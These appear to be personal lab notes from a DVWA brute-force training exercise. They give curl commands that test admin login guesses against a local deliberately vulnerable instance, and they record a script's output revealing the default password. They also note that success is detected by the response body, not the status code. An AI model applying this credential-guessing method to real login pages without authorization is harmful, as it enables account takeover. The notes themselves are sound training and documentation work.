# DVWA Brute Force — Commands

## 1. Verify Lab Directory

```bash
cd ~/Alrazzaq_Labs/DVWA/01-Brute-Force
```

**Purpose:** Navigate to the Brute Force lab directory.

---

## 2. Test the DVWA Endpoint

```bash
curl -i "http://localhost:8080/DVWA/vulnerabilities/brute/"
```

**Purpose:** Verify that the DVWA Brute Force endpoint is reachable.

---

## 3. Test an Incorrect Password

```bash
curl -i \
  -H 'Cookie: PHPSESSID=YOUR_SESSION_ID; security=low' \
  "http://localhost:8080/DVWA/vulnerabilities/brute/?username=admin&password=admin123&Login=Login"
```

**Expected result:**

```text
HTTP/1.1 200 OK
```

Response:

```text
Username and/or password incorrect.
```

**Purpose:** Establish the application's response for an invalid password.

---

## 4. Test a Password Candidate

```bash
curl -i \
  -H 'Cookie: PHPSESSID=YOUR_SESSION_ID; security=low' \
  "http://localhost:8080/DVWA/vulnerabilities/brute/?username=admin&password=password&Login=Login"
```

**Expected result:**

```text
HTTP/1.1 200 OK
```

Response:

```text
Welcome to the password protected area admin
```

**Purpose:** Confirm a successful authentication response.

---

## 5. Inspect HTTP Requests

Browser Developer Tools were used to inspect the request generated by the DVWA Brute Force form.

Observed request structure:

```text
GET /DVWA/vulnerabilities/brute/?username=admin&password=<PASSWORD>&Login=Login
```

Important request components:

```text
Method: GET
Host: localhost:8080
Endpoint: /DVWA/vulnerabilities/brute/
Parameter: username
Parameter: password
Parameter: Login
Cookie: PHPSESSID
Cookie: security=low
```

**Purpose:** Understand the authentication request and identify the parameters required for testing.

---

## 6. Run the Automated Test

```bash
./brute-test.sh
```

**Observed output:**

```text
[-] Failed: 123456
[+] Password found: password
```

**Purpose:** Automate password-candidate testing against the local DVWA lab.

---

## 7. Check Script Permissions

```bash
ls -l brute-test.sh
```

If the script is not executable:

```bash
chmod +x brute-test.sh
```

Then:

```bash
./brute-test.sh
```

**Purpose:** Ensure the Bash script has execute permissions.

---

## 8. Review the Script

```bash
cat brute-test.sh
```

or:

```bash
less brute-test.sh
```

**Purpose:** Review the automation logic and understand how each password candidate is submitted and how the response is evaluated.

---

# 🔍 Key Observations

### Successful Request

```text
HTTP/1.1 200 OK
```

with:

```text
Welcome to the password protected area admin
```

### Failed Request

```text
HTTP/1.1 200 OK
```

with:

```text
Username and/or password incorrect.
```

### Important Finding

The HTTP status code alone did not distinguish success from failure because both responses returned:

```text
200 OK
```

The response body was therefore used as the indicator of authentication success.

# 🧹 Cleanup

After completing the lab, remove or protect any files containing real credentials or session identifiers.

Do not commit active session cookies such as:

```text
PHPSESSID=...
```

to GitHub.

For portfolio documentation, replace sensitive session values with:

```text
YOUR_SESSION_ID
```

All commands in this lab were executed against a deliberately vulnerable DVWA instance hosted on:


Do not use these tests against systems without explicit authorization.
